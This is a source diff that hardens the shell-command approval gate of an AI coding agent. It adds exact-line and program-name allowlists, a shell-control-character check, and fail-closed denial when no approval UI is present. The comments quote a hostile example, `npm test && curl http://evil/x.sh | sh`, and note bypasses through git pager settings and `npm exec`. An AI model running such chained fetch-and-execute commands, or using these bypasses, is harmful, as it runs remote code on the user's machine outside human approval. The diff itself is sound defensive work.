@@ -105,10 +105,120 @@ export const toolRegistry = new ToolRegistry();
 // Allowlist of commands approved for the current session only.
 // Intentionally NOT persisted to localStorage — auto-approvals reset on restart
 // to prevent a compromised renderer from exploiting stale approvals.
+/**
+ * Session command allowlist (#606, #609).
+ *
+ * Two scopes, kept apart on purpose. The approval modal is the ONLY boundary
+ * between the model and a shell — autonomy level does not gate it, and the
+ * Rust side passes the whole line to `sh -c` unfiltered — so what "Always
+ * Allow" remembers decides how wide that boundary opens.
+ *
+ * `cliAllowlist` (exact) holds whole normalised command lines and is the
+ * default. `cliBinaryAllowlist` holds bare program names and must be asked
+ * for deliberately, because "allow npm" also allows
+ * `npm test && curl http://evil/x.sh | sh`.
+ *
+ * cliAllowlist stays exported under its old name: it is read and cleared by
+ * the UI and by tests, and it is still the set an approval writes to by
+ * default.
+ */
 export const cliAllowlist = new Set<string>();
+
+/** Program-name approvals — deliberately opt-in; see cliAllowlist. */
+export const cliBinaryAllowlist = new Set<string>();
 
 export function persistCliAllowlist(): void {
   // no-op: session-only by design
+}
+
+/**
+ * The binary (first token) of a command line, for binary-level allowlisting.
+ * "Always allow any npm command" covers `npm run build` as well as `npm test`;
+ * exact matching alone turned 'auto' runs into an approval treadmill, which is
+ * why the wider scope still exists — but only when explicitly chosen.
+ */
+export function commandBinary(command: string): string {
+  return command.trim().split(/\s+/)[0] ?? '';
+}
+
+/** Collapse whitespace so re-approval is not defeated by spacing alone. */
+export function normalizeCommand(command: string): string {
+  return command.trim().replace(/\s+/g, ' ');
+}
+
+/**
+ * Shell control characters. Their presence means the line does more than run
+ * the program named by its first token, so a program-name approval must not
+ * cover it.
+ *
+ * A character-class scan, not a list of operators: an operator list misses a
+ * bare `&`, a lone `<`, and `(`, and any word-based denylist ("rm", "sudo")
+ * is trivially rewritten around. This check is structural and fails closed.
+ * It still does not make binary scope SAFE — `git -c core.pager='sh -c …' log`
+ * and `npm exec -- …` contain none of these — which is why exact scope is the
+ * default and this is only defence in depth.
+ */
+const SHELL_CONTROL_CHARS = /[;&|`$<>(){}\n\r]/;
+
+export function hasShellControlChars(command: string): boolean {
+  return SHELL_CONTROL_CHARS.test(command);
+}
+
+/** True when the command is covered by an exact or binary-level approval. */
+export function isCommandAllowlisted(command: string): boolean {
+  const normalized = normalizeCommand(command);
+  // Exact scope: what the user actually saw and approved.
+  if (cliAllowlist.has(command) || cliAllowlist.has(normalized)) return true;
+  // Binary scope: only for a plain `program args…` line. Anything that can
+  // chain, substitute or redirect re-prompts, however familiar its first token.
+  if (hasShellControlChars(command)) return false;
+  const bin = commandBinary(command);
+  return bin !== '' && cliBinaryAllowlist.has(bin);
+}
+
+/**
+ * The core toolset sent with agentic requests (#audit-3). Every registered
+ * tool used to ship with every request — ~60+ definitions that alone could
+ * fill a small context window. This is the task-relevant working set; MCP and
+ * user-registered tools are appended by the caller.
+ */
+export const CORE_AGENT_TOOLS = [
+  'read_file', 'write_file', 'apply_edit', 'apply_patch',
+  'list_dir', 'glob_files', 'search_files',
+  'run_shell_command', 'run_tests', 'run_checks',
+  'git_diff', 'git_status', 'update_plan',
+] as const;
+
+// The approval callback registered by the UI, kept module-level so other
+// command-running tools (run_tests / run_checks overrides) share the SAME
+// approval policy as run_shell_command instead of opening an unaudited path.
+let _cliApprovalCallback: ((command: string, cwd?: string) => Promise<boolean>) | null = null;
+
+/**
+ * Allow commands when no approval UI is registered. Off by default: with no
+ * gate present the safe answer is "no", not "yes". Tests that exercise the
+ * command path opt in explicitly.
+ */
+let _allowWithoutApprovalUi = false;
+
+/** Test-only escape hatch for the fail-closed default above. */
+export function setAllowCliWithoutApprovalUi(allow: boolean): void {
+  _allowWithoutApprovalUi = allow;
+}
+
+/**
+ * Request approval for a command under the shared CLI policy: allowlisted
+ * commands pass silently; otherwise the UI approval callback decides.
+ *
+ * With no callback registered this now DENIES (#609). In production
+ * registerCliTool always installs one, so this only changes headless and test
+ * behaviour — but a security gate whose absence means "allow" is the wrong
+ * default to carry.
+ */
+export async function requestCliApproval(command: string, cwd?: string): Promise<boolean> {
+  if (isCommandAllowlisted(command)) return true;
+  if (!_cliApprovalCallback) return _allowWithoutApprovalUi;
+  return _cliApprovalCallback(command, cwd);
 }
 
 // ── Tool-output truncation (#396, Codex/Claude/Cursor parity) ────────────────
@@ -146,6 +256,7 @@ interface CliResult {
 export function registerCliTool(
   onApprovalRequired: (command: string, cwd?: string) => Promise<boolean>
 ): void {
+  _cliApprovalCallback = onApprovalRequired;
   toolRegistry.registerTool({
     name: 'run_shell_command',
     description:
@@ -180,7 +291,7 @@ export function registerCliTool(
         }
       }
 
-      if (!cliAllowlist.has(command)) {
+      if (!isCommandAllowlisted(command)) {
         // Approve against the directory the command will actually run in.
         const approved = await onApprovalRequired(command, cwd);
         if (!approved) {
